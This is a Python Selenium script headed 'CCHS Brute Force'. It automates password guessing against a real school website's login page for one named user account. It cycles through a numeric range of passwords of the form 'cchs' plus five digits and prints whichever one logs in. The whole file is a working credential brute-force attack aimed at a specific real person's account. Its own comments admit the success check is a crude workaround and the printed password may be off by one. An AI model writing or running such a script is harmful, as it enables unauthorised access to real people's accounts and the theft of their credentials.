# CCHS Brute Force Python
# various parameters will need to be changed eventually probably
# put the username in the username field, specify a range to check, and then the program will split out the password that worked
# last modified 6/23/21
from selenium import webdriver

#put the username into this field
username = "isanchez2021"
#put the password range into this field cchsXXXXX to cchsXXXXX, this part is the XXXXX
upper_bound = 16500
lower_bound = 15700

driver = webdriver.Chrome("C:\\Dev\\WebDrivers\\chromedriver.exe")

x = lower_bound
login_successful = False
#the loops will run until x hits the upper bound or the login is successful
while(x <= upper_bound and login_successful == False):
    try:
        #sets the password to cchsXXXXX where XXXXX starts at the lower bound and increments to the upper bound
        password = "cchs" + str(x)

        #refreshes the driver to prevent it from becoming 'stale'
        #driver = webdriver.Chrome("C:\\Dev\\WebDrivers\\chromedriver.exe")
        driver.get("https://www.centralcatholic.net/fs/login")

        # clears the previous username
        driver.find_element_by_id("fsLoginUsernameField43").clear()
        # inputs the username
        username_textbox = driver.find_element_by_id("fsLoginUsernameField43")
        username_textbox.send_keys(username)

        # waits until the page is loaded
        driver.implicitly_wait(10)

        #inputs the password
        driver.find_element_by_id("fsLoginPasswordField43").send_keys(password)

        #clicks the login button
        driver.find_element_by_name("commit").submit()

        print(password)

        #increments x
        x = x + 1
    #a strange workaround to drive.current_url not working for some reason
    except:
        break

if x == upper_bound:
    print("The program reached the upper bound without a successful login")
else:
    print(f'Username:{username}\nPassword:{password}')
    print("The code is a little strange. It is possible that this result is one higher than the actual password.")

#closes the driver
driver.quit()